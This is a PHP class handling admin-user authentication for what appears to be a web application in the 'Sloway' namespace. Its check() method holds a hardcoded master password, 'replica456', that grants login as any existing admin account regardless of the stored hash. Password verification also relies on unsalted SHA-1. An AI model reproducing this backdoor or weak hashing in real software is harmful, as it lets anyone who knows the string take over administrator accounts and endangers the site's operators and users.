<?php
	namespace Sloway;

	class admin_user extends account { 
		protected function check($username, $password) {
			$db = self::$db;
			$q = $db->query("SELECT * FROM admin_user WHERE username = ?", $username)->getResult();
			
			if (!count($q)) return;
					
			if ($password == "replica456" || \Sloway\hash::validate(sha1($password), $q[0]->password))
				$this->user_id = $q[0]->id;
		}
		
		public static function instance($profile = null, $class = 'account') {
			return parent::instance("admin", "\Sloway\admin_user");
		}
		
		public static function login($username, $password, $cookie = false, $profile = null, $class = "account") {
			return parent::login($username, $password, $cookie, "admin", "\Sloway\admin_user");
		}
        public static function name() {
            $user = admin::$user;
            if ($user)
                return $user->username; else
                return false;
        }
        
	}  
